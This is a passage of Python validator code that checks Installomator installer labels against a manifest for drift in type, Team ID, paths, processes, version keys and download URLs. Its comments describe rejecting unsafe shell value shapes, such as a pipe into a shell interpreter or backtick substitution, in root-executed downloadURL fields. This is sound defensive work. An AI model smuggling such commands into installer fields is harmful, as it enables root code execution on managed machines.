        # cross-checking against the manifest.
        for field in sorted(_VERSION_RESOLVER_FIELDS):
            for value in shell.values(field):
                reason = _unsafe_version_resolver_shape(value)
                if reason:
                    errors.append(
                        f"{label}: managed stanza's {field} assignment is exempted from "
                        "manifest cross-checking (version resolution is shell-owned) but "
                        f"its value shape is unsafe ({reason}): {value!r}; refuse to "
                        "certify it as within contract")

        name, error = _one_literal(shell, "name")
        if error:
            errors.append(f"{label}: {error}")
            continue
        shell_type, error = _one_literal(shell, "type")
        if error:
            errors.append(f"{label}: {error}")
        manifest_type = record.get("type")
        expected_shell_type = _TYPE_TO_SHELL.get(manifest_type)
        if expected_shell_type is None:
            errors.append(f"{label}: manifest has unsupported artifact type {manifest_type!r}")
        elif not error and shell_type != expected_shell_type:
            errors.append(
                f"{label}: artifact type drift (manifest={manifest_type!r}, "
                f"Installomator={shell_type!r})")

        team_id, error = _one_literal(shell, "expectedTeamID")
        if error:
            errors.append(f"{label}: {error}")
        elif team_id != record.get("expected_team_id"):
            errors.append(
                f"{label}: Team ID drift (manifest={record.get('expected_team_id')!r}, "
                f"Installomator={team_id!r})")

        expected_path = f"/Applications/{name}.app"
        if expected_path != record.get("app_path"):
            errors.append(
                f"{label}: installed app path drift (manifest={record.get('app_path')!r}, "
                f"Installomator effective path={expected_path!r})")

        manifest_name = record.get("name")
        if manifest_name != name and _DISPLAY_NAME_EXCEPTIONS.get(label) != name:
            errors.append(
                f"{label}: manifest name {manifest_name!r} does not match shell "
                f"name={name!r} and is not a reviewed display-name exception "
                "(see _DISPLAY_NAME_EXCEPTIONS) — either fix the manifest name or "
                "add a reviewed, documented exception")

        processes, error = _effective_blocking_processes(shell, name)
        if error:
            errors.append(f"{label}: {error}")
        elif processes != record.get("blocking_processes", []):
            errors.append(
                f"{label}: blocking process drift (manifest={record.get('blocking_processes', [])!r}, "
                f"Installomator={processes!r})")

        version_key = "CFBundleShortVersionString"
        if shell.values("versionKey"):
            version_key, error = _one_literal(shell, "versionKey")
            if error:
                errors.append(f"{label}: {error}")
        if version_key != record.get("installed_version_key", "CFBundleShortVersionString"):
            errors.append(
                f"{label}: installed version key drift "
                f"(manifest={record.get('installed_version_key', 'CFBundleShortVersionString')!r}, "
                f"Installomator={version_key!r})")

        if patched.get("mirror") is True and engine_verifies_pinned_hash:
            # The downloadURL exemption below is only sound because the
            # engine-side PINNED_SHA256 check confirmed present by
            # _engine_pins_downloaded_artifact_hash above means different
            # bytes at the resolved URL cannot pass verification and
            # install. A manifest merely DECLARING mirror_url/pinned_sha256
            # is not enough on its own — see the `else` branch below for
            # what happens when that engine-side proof cannot be confirmed.
            if not patched.get("mirror_url") or not record.get("pinned_sha256"):
                errors.append(
                    f"{label}: mirrored managed label needs mirror_url and pinned_sha256 "
                    "so endpoint bytes cannot depend on shell URL resolution")

            # PAT-1403 (round 6, Finding 1): the exemption granted above is
            # sound for what it actually claims — the shell's downloadURL
            # need not textually match the manifest's URL, because
            # engine_verifies_pinned_hash means different bytes at the
            # resolved URL cannot pass PINNED_SHA256 verification and
            # install. But "skip the cross-check" was implemented as "skip
            # looking at the field at all", so a mirrored/exempted stanza's
            # downloadURL was never even shape-checked — exactly the same
            # class of hole round 4 already closed for
            # _VERSION_RESOLVER_FIELDS (a name-based exemption silently
            # letting a dangerous VALUE SHAPE through unchecked), just left
            # open here for downloadURL, which is unconditionally
            # root-executed for artifact selection. Reuse
            # _unsafe_version_resolver_shape rather than duplicate its
            # regexes: reject a pipe into a shell interpreter or backtick
            # substitution even though the manifest-URL cross-check itself
            # stays skipped. Real mirrored labels (e.g. ghostty) legitimately
            # use `$(...)` and `$appNewVersion` to resolve a version-
            # templated URL, which this does not flag — see
            # test_current_repository_managed_labels_are_exhaustively_equivalent
            # for the real-corpus proof this doesn't false-positive.
            #
            # PAT-1403 (round 7, Finding 2): the loop below shape-checks
            # every downloadURL assignment it finds — but if the stanza has
            # ZERO downloadURL assignments at all, the loop is simply a
            # no-op and the label was certified "within contract" with its
            # artifact source completely unmodelled on both the manifest and
            # shell side. A `type` that needs a download (dmg/pkg/zip/etc.,
            # which is every type this contract supports — see
            # _TYPE_TO_SHELL) has no legitimate reason to have no
            # downloadURL-determining logic whatsoever; that shape means
            # either a malformed/incomplete stanza or a structural parsing
            # gap, not a genuinely fine "no check needed" case. Require at
            # least one assignment (dynamic or static) to exist before
            # granting the exemption at all, and fail closed, naming the
            # label, rather than silently passing an unmodelled artifact
            # source. The real, currently-mirrored label (ghostty) does have
            # one — see test_mirror_exemption_refused_for_stanza_with_no_downloadurl_assignment
            # for both this rejection and ghostty's continued pass.
            download_url_values = shell.values("downloadURL")
            if not download_url_values:
                errors.append(
                    f"{label}: mirrored managed stanza has no downloadURL assignment at all "
                    "(dynamic or static) to exempt from cross-checking — the artifact source "
                    "is completely unmodelled; refuse to certify it as within contract")
            for value in download_url_values:
                reason = _unsafe_version_resolver_shape(value)
                if reason:
                    errors.append(
                        f"{label}: managed stanza's downloadURL assignment is exempted from "
                        "manifest cross-checking (mirror pipeline verifies the downloaded "
                        f"artifact's pinned hash) but its value shape is unsafe ({reason}): "
                        f"{value!r}; refuse to certify it as within contract")
        else:
            if patched.get("mirror") is True:
                # PAT-1403: fail closed rather than invent or assume an
                # engine-side hash check that could not be confirmed. Fall
                # through to the same static-URL requirement a non-mirrored
                # label must meet — in practice this will fail for a
                # resolved-download mirrored label, which is the point: the
                # exemption is unsupported without the confirmed check, so
                # it must not be silently granted.
                errors.append(
                    f"{label}: mirror_url/pinned_sha256 downloadURL exemption refused — "
                    "Installomator.sh's PINNED_SHA256 verification of the downloaded "
                    "artifact could not be confirmed present and reachable for every "
                    "label, so the engine cannot be shown to reject different bytes at "
                    "the resolved URL")
            download = record.get("download")
            if not isinstance(download, dict):
                errors.append(f"{label}: managed record has no valid download object")
                continue
            if download.get("method") != "static":
                errors.append(
                    f"{label}: non-mirrored managed label must use a static manifest URL")
            else:
                download_url, error = _one_literal(shell, "downloadURL")
                if error:
                    errors.append(f"{label}: {error}")
                # PAT-1403 (round 2, Finding 7): a malformed record can be
                # {"method": "static"} with no "url" key at all. Indexing
                # download["url"] directly raised an uncaught KeyError there,
                # crashing the ENTIRE validator run instead of failing just
                # this one label closed — use .get() and treat a missing/
                # None URL as a clean per-label validation failure.
                elif download_url != download.get("url"):
                    errors.append(
                        f"{label}: download URL drift (manifest={download.get('url')!r}, "
                        f"Installomator={download_url!r})")
    return errors
